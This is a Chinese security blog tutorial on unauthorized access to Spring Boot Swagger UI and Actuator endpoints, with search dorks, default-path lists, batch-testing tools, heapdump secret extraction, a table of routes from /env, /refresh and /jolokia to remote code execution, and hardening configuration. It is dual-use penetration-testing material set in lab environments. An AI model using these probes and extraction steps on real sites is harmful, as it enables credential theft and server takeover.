#  浅析SpringBoot框架常见未授权访问漏洞   
Jack  黑曜网安实验室   2025-05-26 10:07  
  
星标公众号可大图观看！  
  
前言  
  
在对 Java 站点进行渗透测试的过程中，经常会遇见各类未授权访问漏洞，本文来总结学习下常见的几类未授权访问漏洞的检测和利用方法。  
  
SpringBoot 站点的简单识别方法：  
  
1） 通过 API 接口的 Web 服务。通俗的来讲，Swagger 就是将项目中所有（想要暴露的）接口展现在页面上，并且可以进行接口调用和测试的服务。  
  
在平时渗透测试的的时候，经常会发现 Swagger ui（swagger-ui 是将 api 接口进行可视化展示的工具）接口泄露，如下，在这个页面中暴露了目标站点中所有的接口信息，所以可以对这个接口进行漏洞测试，看是否存在未授权访问、sql 注入、文件上传等漏洞。  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjSJ26v6OlZUwXBK1hToE1KhnicCoCSXRp8vRXEPAXaWRrJp9kg0GDLgw/640?wx_fmt=png "")  
  
```
Fofa搜索语法：title="Swagger UI"Google hack语法：intext:"Swagger UI" intitle:"Swagger UI" site:yourarget.com
```  
  
修复 Swagger 未授权访问漏洞的方案：  
1. 配置 Swagger 开启页面访问限制；  
  
1. 排查接口是否存在敏感信息泄露（例如：账号密码、SecretKey、OSS配置等），若有则进行相应整改。  
  
Swagger 未授权访问地址可能存在于以下默认路径：  
```
/api/api-docs/api-docs/swagger.json/api.html/api/api-docs/api/apidocs/api/doc/api/swagger/api/swagger-ui/api/swagger-ui.html/api/swagger-ui.html//api/swagger-ui.json/api/swagger.json/api/swagger//api/swagger/ui/api/swagger/ui//api/swaggerui/api/swaggerui//api/v1//api/v1/api-docs/api/v1/apidocs/api/v1/swagger/api/v1/swagger-ui/api/v1/swagger-ui.html/api/v1/swagger-ui.json/api/v1/swagger.json/api/v1/swagger//api/v2/api/v2/api-docs/api/v2/apidocs/api/v2/swagger/api/v2/swagger-ui/api/v2/swagger-ui.html/api/v2/swagger-ui.json/api/v2/swagger.json/api/v2/swagger//api/v3/apidocs/apidocs/swagger.json/doc.html/docs//druid/index.html/graphql/libs/swaggerui/libs/swaggerui//spring-security-oauth-resource/swagger-ui.html/spring-security-rest/api/swagger-ui.html/sw/swagger-ui.html/swagger/swagger-resources/swagger-resources/configuration/security/swagger-resources/configuration/security//swagger-resources/configuration/ui/swagger-resources/configuration/ui//swagger-ui/swagger-ui.html/swagger-ui.html#/api-memory-controller/swagger-ui.html//swagger-ui.json/swagger-ui/swagger.json/swagger.json/swagger.yml/swagger//swagger/index.html/swagger/static/index.html/swagger/swagger-ui.html/swagger/ui//Swagger/ui/index/swagger/ui/index/swagger/v1/swagger.json/swagger/v2/swagger.json/template/swagger-ui.html/user/swagger-ui.html/user/swagger-ui.html//v1.x/swagger-ui.html/v1/api-docs/v1/swagger.json/v2/api-docs/v3/api-docs
```  
### RESTful API 设计风格  
  
REST，全名 Representational State Transfer (表现层状态转移)，它是一种设计风格，一种软件架构风格，而不是标准，只是提供了一组设计原则和约束条件。RESTful 只是转为形容词，就像那么 RESTful API 就是满足 REST 风格的，以此规范设计的 API。  
  
举个例子：提供一个订单信息 API，早期程序员为了更方便传递信息全部使用了 POST 请求，使用了定义了 method 表明调用方法：  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjFc6ibiaEukUzicNrpoKweN5DeudaDTDuzCQDtkNQibqialcZPblUS95UYDA/640?wx_fmt=png "")  
  
  
现在来看上述例子会觉得设计上很糟糕，但是在当时大量的 API 是这样设计的。操作资源的动作全部在数据体里面重新定义了一遍，URL 上不能体现出任何有价值的信息，为缓存机制带来麻烦。对前端来说，在组装请求的时候显得麻烦不说，另外返回到数据的时候需要检查 HTTP 的状态是不是 200，还需要检查 status 字段。那么使用 RESTful 的例子是什么样呢：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjUunq4GveXWh3dNvVFgicLuZ2LALjBNjcTCA95cWV3VazNz8zcsXiaOcw/640?wx_fmt=png "")  
  
  
上述例子体现的 RESTful API 的优点：  
1. 使用路径参数构建 URL 和 HTTP 动词来区分我们需要对服务所做出的操作，而不是使用 URL 上的接口名称，例如 getProducts 等；  
  
1. 使用 HTTP 状态码，而不是在 body 中自定义一个状态码字段；  
  
1. URL 有层次的设计，例如 /catetory/{category_id}/products  
 便于获取 path 参数，在以后例如负载均衡和缓存的路由非常有好处。  
  
RESTful 的本质是基于 HTTP 协议对资源的增删改查操作做出定义。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjticYuZ4rZYGXuBibK0Gq7bO3OWIeUsfFKOiaaNN7s6GbBRlkIJl5iaVmRQ/640?wx_fmt=png "")  
  
  
几个典型的 RESTful API 场景：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvj73U5Xqp2ZBCRia3LqnvWpXcaOVJG1FTGTncsG6g3lNyNply5rjiaMLhg/640?wx_fmt=png "")  
  
### swagger-ui 未授权访问  
  
下面使用 Java 安全综合靶场搭建 Swagger 漏洞环境：https://github.com/JoyChou93/java-sec-code，直接下载源码后在虚拟机基于 Docker 快速搭建：  
```
1）Start docker:docker-compose pulldocker-compose up2）Stop docker:docker-compose down3）登录地址与密码：http://localhost:8080/login，admin/admin123
```  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjCouZgZVPowgynyxaNT27VX9dQCOiasMRuvTPCYqGsoZIhAl2GCf1oxw/640?wx_fmt=png "")  
  
  
实际上 java-sec-code 靶场并不存在 Swagger-ui 未授权访问漏洞，需要用户登录以后才能访问到 swagger-ui，此处我们假设无需登录即可访问：  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjib2pZSKMIEqQAd01dibjMubVVVqDibapujSkoTicGwCssM22QK3Qcnn4Sg/640?wx_fmt=png "")  
  
  
路由swagger-ui.html#/  
列举了所有的 api 接口，以 login 接口为例：  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjcJFicjjS3ibKcQ2CNDvBxRWofUcFib8u0wzwFaZ7QbCMibiaCW3dAoUM8OQ/640?wx_fmt=png "")  
  
  
点击 Try it out --> Execute 可以调用接口并查看服务器返回数据：  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjShZPCDY5pVmfEMITfaNYU8bNtdNgPOggyE7NMWCj5MDC6CJUY3gznA/640?wx_fmt=png "")  
  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjHe3WgaCT94v7gFaFowPse3eAhOT9BYm0FV7UVOf60tYRbRq2L9EyLQ/640?wx_fmt=png "")  
  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjcaD2UqNfK5qy4c1qMfxibmiciciaf2JjJNibAMy3UjDPf5fIo1Xybomq4bw/640?wx_fmt=png "")  
  
  
Swagger-ui 提供的 Restful API 接口也会同步提供相应的，发起模拟请求时可以填入具体参数值后再发送请求，比如 SSRF 漏洞示例接口http://ip:8080/ssrf/urlConnection/vuln?url=XXX  
：  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvj3Tlu9mxI5eYy79se1cicWM2U7ExiaMib43XMlxiaL8geUpSbcAtQPGuPDg/640?wx_fmt=png "")  
  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjLicMel3BsavfKcVibAHeNgKWicAT6xbufhnMZByWS803YO7gp7XlhDnkw/640?wx_fmt=png "")  
  
### swagger 接口批量探测  
  
通过访问 api-docs 或者 swagger.json 可以直接获取 Json 格式的全部接口文档：  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjYia0wIWibqHUUGpUmd9pgMmsicORoB3fmwEV64l3Pu3yibgAjzG3Cya2EQ/640?wx_fmt=png "")  
  
  
具体地址可在 swagger-ui 页面上找到：  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjrMcsyTQKmiamMWdib4kusCM0HwxhbhqAxqcWsLKiaY0icBCZmtOaXeaw1Q/640?wx_fmt=png "")  
  
  
在目标系统存在大量 API 接口的情况下，逐一进行手工测试的话会消耗大量精力，可以使用一些现成的自动化工具来快速完成此项工作。  
  
**0x01 Postman API工具**  
  
第一种方案是借助 Postman 工具（或者 Apifox 工具：https://apifox.com/），利用思路：  
1. 将 Swagger ui 中所有的接口导入到 Postman；  
  
1. 在 Postman 设置代理，将流量转发给 Burpsuite，方便观察发包情况；  
  
1. 对导入的所有 api 自动运行测试，让 Postman 自动对每个 api 进行请求；  
  
1. Burpsuite 可挂上 Xray，进行自动化漏洞检测；  
  
具体演示请参见：《Swagger ui接口自动化批量漏洞测试》、《Actuator内存泄露及利用&Swagger未授权&自动化测试实现》。  
  
Postman 导入数据总是失败，此处用 Apifox 应用导入目标 Swagger API 接口：  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvj7jQERbia55y2ibzrVyVLJnLjEXFEaZicOgsjsKEibjk5JzvaHkwVIMFoFQ/640?wx_fmt=png "")  
  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjJoMpf0DFw0WkibpvV8tdyMLFARTEzS59libbORrpkxCibibNG1Fw8a7FPg/640?wx_fmt=png "")  
  
  
发送测试请求（下面是单独一个接口，实际上可以批量发送请求）：  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjb4LKvPLKJkDVuu6uZXiciaXHQlCST5OHMtJWhoZCBGQlAgsKQAgczQgA/640?wx_fmt=png "")  
  
  
接下来设置网络代理将流量转发到 Burpsuite：  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjCrLR7Yrtaf2eg35R3HskjiagNqIklCVcw02TwUtdibn59CH4yLibgcWRQ/640?wx_fmt=png "")  
  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvj8mHswmUo2xP4M9PSyGIr2SCFekb13FKVcs2Rpiap4XQjVaDtq6R2zog/640?wx_fmt=png "")  
  
  
BurpSuite 联动 Xray 进行漏洞扫描就不演示了，参见 Xray 官方文档即可：https://docs.xray.cool/。  
  
**0x02 Github开源工具：swagger-hack**  
  
项目地址：https://github.com/jayus0821/swagger-hack  
```
python .\swagger-hack2.0.py -u https://XXX.XXX.XXX.200:444/swagger/v1/swagger.json
```  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjAugBCMdN8mhtRnGbXRVhsqsh5EbewApDkhPiblSjw2cHze25l2DYgibg/640?wx_fmt=png "")  
  
  
会自动构造参数并发送请求包，同时记录返回数据到本地统计表格：  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjA9jJphkbriau92LGgsNicBaFN4rgU4zm2UwsPuIJkjdiauic9tPhrPhsibg/640?wx_fmt=png "")  
  
> 【More】 swagger-ui 还存在过 XSS 漏洞，详情请参见：《Hacking Swagger-UI - from XSS to account takeovers》、《渗透技巧基于Swagger-UI的XSS》。  
  
## Springboot Actuator  
  
Actuator 是 springboot 提供的用来对应用系统进行自省和监控的功能模块，借助于 Actuator 开发者可以很方便地对应用系统某些监控指标进行查看、统计等。在 Actuator 启用的情况下，如果没有做好相关权限控制，非法用户可通过访问默认的执行器端点（endpoints）来获取应用系统中的监控信息，从而导致信息泄露甚至服务器被接管的事件发生。  
  
【影响版本】  
- Spring Boot < 1.5 默认未授权访问所有端点；  
  
- Spring Boot >= 1.5 默认只允许访问 /health 和 /info 端点，但是此安全性通常被应用程序开发人员禁用。  
  
Actuator 提供的执行器端点分为两类：原生端点和用户自定义扩展端点，原生端点主要有：  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjRNdpYuJHGv9Qf92SlicyNujL3M4dPePrTmk0Xic0W1Tr6aMtqicvFM3BQ/640?wx_fmt=png "")  
  
  
需要注意的是：  
1. Spring Boot 1.x 版本的 Actuator 端点在根 URL 下注册（比如 java-sec-code 靶场环境），Spring Boot 2.x 版本的 Actuator 端点移动到 /actuator/ 路径下（比如下文将用到的 Vulhub 靶场的 CVE-2022-22947 环境）；  
  
1. 有些程序员会自定义 spring 的根路径，比如 /manage、/management 、项目 App 相关名称等；  
  
1. Spring Boot Actuator 默认的内置路由名字，如 /env 有时候也会被程序员修改，比如修改成 /appenv；  
  
Actuator-api 的官方文档：https://docs.spring.io/spring-boot/docs/current/actuator-api/htmlsingle/，官方文档对每个端点的功能进行了描述。  
```
/actuator/actuator/metrics/actuator/mappings/actuator/beans/actuator/configprops/actuator/auditevents/actuator/beans/actuator/health/actuator/conditions/actuator/configprops/actuator/env/actuator/info/actuator/loggers/actuator/heapdump/actuator/threaddump/actuator/metrics/actuator/scheduledtasks/actuator/httptrace/actuator/jolokia/actuator/hystrix.stream/actuator/auditevents/autoconfig/beans/caches/conditions/configprops/docs/dump/env/flyway/health/heapdump/httptrace/info/intergrationgraph/jolokia/logfile/loggers/liquibase/metrics/mappings/prometheus/refresh/scheduledtasks/sessions/shutdown/trace/threaddump
```  
### 未授权访问数据利用  
  
对于寻找漏洞比较重要的接口和其可能的利用方式可总结如下：  
<table><thead><tr style="box-sizing: border-box;border-width: 0.02rem 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(221, 221, 221);background-color: rgb(255, 255, 255);"><th style="box-sizing: border-box;border-width: 0.02rem;border-style: solid;border-color: rgb(221, 221, 221);padding: 0.16rem;font-weight: bold;text-align: left;word-break: normal;background-color: rgb(239, 243, 245);color: rgb(79, 79, 79);line-height: 0.44rem;vertical-align: middle;font-size: 0.24rem !important;"><section><span leaf="">接口</span></section></th><th style="box-sizing: border-box;border-width: 0.02rem;border-style: solid;border-color: rgb(221, 221, 221);padding: 0.16rem;font-weight: bold;text-align: left;word-break: normal;background-color: rgb(239, 243, 245);color: rgb(79, 79, 79);line-height: 0.44rem;vertical-align: middle;font-size: 0.24rem !important;"><section><span leaf="">利用方式</span></section></th></tr></thead><tbody><tr style="box-sizing: border-box;border-width: 0.02rem 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(221, 221, 221);background-color: rgb(255, 255, 255);"><td style="box-sizing: border-box;border-width: 0.02rem;border-style: solid;border-color: rgb(221, 221, 221);padding: 0.16rem;word-break: normal;color: rgb(79, 79, 79);line-height: 0.44rem;vertical-align: middle;text-align: left;font-size: 0.24rem !important;"><section><span leaf="">/env、/actuator/env</span></section></td><td style="box-sizing: border-box;border-width: 0.02rem;border-style: solid;border-color: rgb(221, 221, 221);padding: 0.16rem;word-break: normal;color: rgb(79, 79, 79);line-height: 0.44rem;vertical-align: middle;text-align: left;font-size: 0.24rem !important;"><section><span leaf="">GET 请求 /env 可能会直接泄露环境变量、内网地址、配置中的用户名、mysql 安装路径、数据库密码（可能带*）、关键密钥等敏感数据</span></section></td></tr><tr style="box-sizing: border-box;border-width: 0.02rem 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(221, 221, 221);background-color: rgb(247, 247, 247);"><td style="box-sizing: border-box;border-width: 0.02rem;border-style: solid;border-color: rgb(221, 221, 221);padding: 0.16rem;word-break: normal;color: rgb(79, 79, 79);line-height: 0.44rem;vertical-align: middle;text-align: left;font-size: 0.24rem !important;"><section><span leaf="">/trace、/actuator/trace</span></section></td><td style="box-sizing: border-box;border-width: 0.02rem;border-style: solid;border-color: rgb(221, 221, 221);padding: 0.16rem;word-break: normal;color: rgb(79, 79, 79);line-height: 0.44rem;vertical-align: middle;text-align: left;font-size: 0.24rem !important;"><section><span leaf="">/trace 路径包含一些 http 请求包访问跟踪信息，有可能在其中发现内网应用系统的一些请求信息详情、以及有效用户或管理员的 authorization（token、JWT、cookie）等字段</span></section></td></tr><tr style="box-sizing: border-box;border-width: 0.02rem 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(221, 221, 221);background-color: rgb(255, 255, 255);"><td style="box-sizing: border-box;border-width: 0.02rem;border-style: solid;border-color: rgb(221, 221, 221);padding: 0.16rem;word-break: normal;color: rgb(79, 79, 79);line-height: 0.44rem;vertical-align: middle;text-align: left;font-size: 0.24rem !important;"><section><span leaf="">/heapdump、/actuator/heapdump</span></section></td><td style="box-sizing: border-box;border-width: 0.02rem;border-style: solid;border-color: rgb(221, 221, 221);padding: 0.16rem;word-break: normal;color: rgb(79, 79, 79);line-height: 0.44rem;vertical-align: middle;text-align: left;font-size: 0.24rem !important;"><section><span leaf="">可尝试访问网站的 /actuator/heapdump 接口，下载返回的 GZip 压缩 堆转储文件，可使用 Eclipse MemoryAnalyzer 加载，通过站点泄露的内存信息，有机会查看到后台账号信息和数据库账号等</span></section></td></tr><tr style="box-sizing: border-box;border-width: 0.02rem 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(221, 221, 221);background-color: rgb(247, 247, 247);"><td style="box-sizing: border-box;border-width: 0.02rem;border-style: solid;border-color: rgb(221, 221, 221);padding: 0.16rem;word-break: normal;color: rgb(79, 79, 79);line-height: 0.44rem;vertical-align: middle;text-align: left;font-size: 0.24rem !important;"><section><span leaf="">/mappings、/actuator/mappings</span></section></td><td style="box-sizing: border-box;border-width: 0.02rem;border-style: solid;border-color: rgb(221, 221, 221);padding: 0.16rem;word-break: normal;color: rgb(79, 79, 79);line-height: 0.44rem;vertical-align: middle;text-align: left;font-size: 0.24rem !important;"><section><span leaf="">由于 mappings 记录了全部的 Url 路径，可以利用该端点寻找未授权接口</span></section></td></tr><tr style="box-sizing: border-box;border-width: 0.02rem 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(221, 221, 221);background-color: rgb(255, 255, 255);"><td style="box-sizing: border-box;border-width: 0.02rem;border-style: solid;border-color: rgb(221, 221, 221);padding: 0.16rem;word-break: normal;color: rgb(79, 79, 79);line-height: 0.44rem;vertical-align: middle;text-align: left;font-size: 0.24rem !important;"><section><span leaf="">/health、/actuator/health</span></section></td><td style="box-sizing: border-box;border-width: 0.02rem;border-style: solid;border-color: rgb(221, 221, 221);padding: 0.16rem;word-break: normal;color: rgb(79, 79, 79);line-height: 0.44rem;vertical-align: middle;text-align: left;font-size: 0.24rem !important;"><section><span leaf="">Git 项目地址的泄露一般在 /health 路径，可探测到站点 git 项目地址并查看源码</span></section></td></tr><tr style="box-sizing: border-box;border-width: 0.02rem 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(221, 221, 221);background-color: rgb(247, 247, 247);"><td style="box-sizing: border-box;border-width: 0.02rem;border-style: solid;border-color: rgb(221, 221, 221);padding: 0.16rem;word-break: normal;color: rgb(79, 79, 79);line-height: 0.44rem;vertical-align: middle;text-align: left;font-size: 0.24rem !important;"><section><span leaf="">/refresh、/actuator/refresh</span></section></td><td style="box-sizing: border-box;border-width: 0.02rem;border-style: solid;border-color: rgb(221, 221, 221);padding: 0.16rem;word-break: normal;color: rgb(79, 79, 79);line-height: 0.44rem;vertical-align: middle;text-align: left;font-size: 0.24rem !important;"><section><span leaf="">POST 请求 /env 接口设置属性后，可同时配合 POST 请求 /refresh 接口刷新 /env 属性变量来触发相关 RCE 漏洞</span></section></td></tr><tr style="box-sizing: border-box;border-width: 0.02rem 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(221, 221, 221);background-color: rgb(255, 255, 255);"><td style="box-sizing: border-box;border-width: 0.02rem;border-style: solid;border-color: rgb(221, 221, 221);padding: 0.16rem;word-break: normal;color: rgb(79, 79, 79);line-height: 0.44rem;vertical-align: middle;text-align: left;font-size: 0.24rem !important;"><section><span leaf="">/restart、/actuator/restart</span></section></td><td style="box-sizing: border-box;border-width: 0.02rem;border-style: solid;border-color: rgb(221, 221, 221);padding: 0.16rem;word-break: normal;color: rgb(79, 79, 79);line-height: 0.44rem;vertical-align: middle;text-align: left;font-size: 0.24rem !important;"><section><span leaf="">暴露出此接口的情况较少，可以配合 POST请求 /env 接口设置属性后，再 POST 请求 /restart 接口重启应用来触发相关 RCE 漏洞</span></section></td></tr><tr style="box-sizing: border-box;border-width: 0.02rem 0px 0px;border-right-style: initial;border-bottom-style: initial;border-left-style: initial;border-right-color: initial;border-bottom-color: initial;border-left-color: initial;border-top-style: solid;border-top-color: rgb(221, 221, 221);background-color: rgb(247, 247, 247);"><td style="box-sizing: border-box;border-width: 0.02rem;border-style: solid;border-color: rgb(221, 221, 221);padding: 0.16rem;word-break: normal;color: rgb(79, 79, 79);line-height: 0.44rem;vertical-align: middle;text-align: left;font-size: 0.24rem !important;"><section><span leaf="">/jolokia、/actuator/jolokia</span></section></td><td style="box-sizing: border-box;border-width: 0.02rem;border-style: solid;border-color: rgb(221, 221, 221);padding: 0.16rem;word-break: normal;color: rgb(79, 79, 79);line-height: 0.44rem;vertical-align: middle;text-align: left;font-size: 0.24rem !important;"><section><span leaf="">可以通过 /jolokia/list 接口寻找可以利用的 MBean，间接触发相关 RCE 漏洞、获得星号遮掩的重要隐私信息的明文等。</span></section></td></tr></tbody></table>  
下面使用 Vulhub 靶场的 CVE-2022-22947 环境，存在 actuator 未授权访问：  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjkMuGXiaQicOewKajDzBrIdHmWOMdK7ksQ2NcW04qJwn8vju127QtxScQ/640?wx_fmt=png "")  
  
**0x01 /actuator/heapdump**  
  
先来看下 /actuator/heapdump 接口，访问后可以下载到一个 hprof 格式的堆转储文件 heapdump：  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjhYXerR95Bz3DnJFUD2p3kPYQdSibutrYMBYGh5BTPnFWNgJhicUjL9cw/640?wx_fmt=png "")  
  
  
heapdump 文件的敏感数据查看工具：  
1. JDumpSpider：https://github.com/whwlsfb/JDumpSpider；  
  
1. Eclipse MemoryAnalyzer：https://eclipse.dev/mat/downloads.php；  
  
第一款工具 JDumpSpider 食用方法很简单：  
```
java-jar JDumpSpider-1.1-SNAPSHOT-full.jar heapdump（文件名）
```  
  
会自动识别、提取敏感信息并进行分类，可惜本案例没有什么敏感信息：  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjLX4Pxjn61BjvAxcnSuRfTxAQIMQ1FBKCbQWO7qtRWEND7eQoIkOwHg/640?wx_fmt=png "")  
  
  
但是 java-code-sec 靶场的 heapdump 文件（请求：http://ip:8080/heapdump  
) 则存在敏感数数据泄露：  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjStaNiahWLfFOWXQDK7ZNWav8RWRkYUYLaQhHWhOl7mRuNQpZRTzLYvA/640?wx_fmt=png "")  
  
  
第二款工具 Eclipse MemoryAnalyzer 需要 Java 17 以上版本，用法参见：《Springboot信息泄露以及heapdump的利用》。  
  
**0x02 /env 路径敏感信息**  
  
上述靶场环境不存在敏感数据，以下借用网上案例，/env 路径泄露多个敏感账户密码：  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjepsib3khENm2vIVIFPEb0ZSKDRcF9cMdBdIp2z1k1sGWpw7poCPzSQA/640?wx_fmt=png "")  
  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjPGGEldicuIRymMBHUnhpTP2mXTFfGYQZIWYQmLQ8QYPPmEzUjzuMGQg/640?wx_fmt=png "")  
  
**0x03 /trace 路径泄露认证凭据**  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjXslREh1kFw22fHxt21RCcLiaMQbjMb2fPH25HeWHFbK2Qs4x21B2icLA/640?wx_fmt=png "")  
  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjFcRicWJXhYEjpnRf114miato5V028L2ZkuJQRcunCjL78JOr9LmfGm4Q/640?wx_fmt=png "")  
  
**0x04 /health 路径泄露 Git 项目地址**  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjFwrNibjKUMyvrrvEFgMibQhQVjKfrTYiagbib8ELxtY1SHFlmGXxjNroNg/640?wx_fmt=png "")  
  
**0x05 /mappings 路径泄露所有 API**  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjEWdubtF1XTAhJX8NlcQwVLNwnADm6MibFZgHpibMdgVT48uYibKTK0XEQ/640?wx_fmt=png "")  
  
  
【More】SpringBoot Actuator 未授权访问漏洞导致的危害不仅仅是信息泄露，结合其他相关组件漏洞可以实现 RCE 的效果，可进一步参见：  
1. https://github.com/LandGrey/SpringBootVulExploit；  
  
1. 奇安信攻防社区-Springboot攻击面初探（一）；  
  
1. Spring Boot Actuator 未授权的测试与利用思路。  
  
相应的靶场环境与复现方式位于 SpringBootVulExploit，这里头实际上涉及多个 CVE 漏洞，此处暂不展开分析。  
### 未授权访问防御手段  
  
作为一名安全dog，不能只挖不修。  
  
【方案一】  
  
在项目的 pom.xml 文件下引入 spring-boot-starter-security 依赖：  
```
<dependency><groupId>org.springframework.boot</groupId><artifactId>spring-boot-starter-security</artifactId></dependency>
```  
  
然后在 application.properties 中开启 security 功能，配置访问账号密码，重启应用即可弹出认证界面：  
```
management.security.enabled=truesecurity.user.name=adminsecurity.user.password=admin
```  
  
【方案二】  
  
可以在 application.properties 配置文件修改配置，开启业务需求上必须的端口（建议全部禁用），通过配置 management.endpoint.<端点名称>.enabled 为 true/false 来开启/禁用端口。  
```
management.endpoints.enabled =false          //直接禁用所有端口management.endpoints.metrics.enabled =true   //开启metrics端点# 通过配置management.endpoint.web.exposure.include=xxx 来暴露某个web端点# 通过配置management.endpoint.web.exposure.exclude=xxx 来隐藏某个web端点# 比如：暴露所有端点（不安全）management.endpoints.web.exposure.include=*# 隐藏(不暴露)端点infomanagement.endpoints.web.exposure.exclude=info# 隐藏(不暴露)端点env beansmanagement.endpoints.web.exposure.exclude=env,beans
```  
### 漏洞自动化检测工具  
  
SpringBoot 框架漏洞探测工具：https://github.com/0x727/SpringBootExploit  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjcD1icwyB041OQzFG9ryia7APibEjGLs37hz5srr4dxNdFx6qfbogJmNTw/640?wx_fmt=png "")  
  
  
一款基于 YAML 语法模板的定制化快速漏洞扫描器：https://github.com/projectdiscovery/nuclei  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjPX2dxUeyTuCmibvX0zwzTwhW50bHczvsrWCtoqHYS15IBVr8HDKn8LA/640?wx_fmt=png "")  
  
  
一款快速、稳定的高性能漏洞扫描器 afrog：https://github.com/zan8in/afrog  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjg2SAGdjbQUAmowAdYaYF7SEuhviag8Vr6n37GjtUbXGdKMicbkVw9KTg/640?wx_fmt=png "")  
  
  
![imagepng](https://mmbiz.qpic.cn/sz_mmbiz_png/XvnzjMsl2ur61lKd3ZmhFhU5pMnxuKvjYrGD0MdSwuibdQaAjqMc6s5dD4uwO0DfKnRAKQsbFW3kC5Io7YeFWXA/640?wx_fmt=png "")  
  
  
